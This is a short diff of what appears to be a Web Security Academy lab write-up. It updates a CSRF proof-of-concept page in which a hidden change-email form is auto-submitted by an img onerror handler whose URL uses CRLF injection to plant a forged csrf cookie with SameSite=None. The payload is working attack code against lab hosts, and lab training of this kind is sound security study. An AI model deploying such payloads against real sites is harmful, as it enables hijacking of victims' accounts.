@@ -40,15 +40,15 @@ Content-Length: 3440
 ```
 
 ```bash
-# Payload
+# Payload: This lab took my hours because of weird bug keep changing email value until it accepts.
 
 <html>
  <body>
-  <form action="https://0aa600fd03e38ed18311006a00b2002e.web-security-academy.net/my-account/change-email" method="POST">
-   <input type="hidden" name="email" value="abcdefgh@email.com"/>
-   <input type="hidden" name="csrf" value="fakeblabla"/>
+  <form action="https://0ad800fb03cc069780b54e1000ac00e8.web-security-academy.net/my-account/change-email" method="POST">
+   <input type="hidden" name="email" value="abcdefghsa@email.com"/>
+   <input type="hidden" name="csrf" value="fake"/>
   </form>
  </body>
-<img src="https://0aa600fd03e38ed18311006a00b2002e.web-security-academy.net/?search=blabla%0d%0aSet-Cookie%3a%20csrf=fakeblabla%3b%20SameSite=None" onerror="document.forms[0].submit()">
+<img src="https://0ad800fb03cc069780b54e1000ac00e8.web-security-academy.net/?search=blabla%0d%0aSet-Cookie%3a%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()">
 </html>
 ```
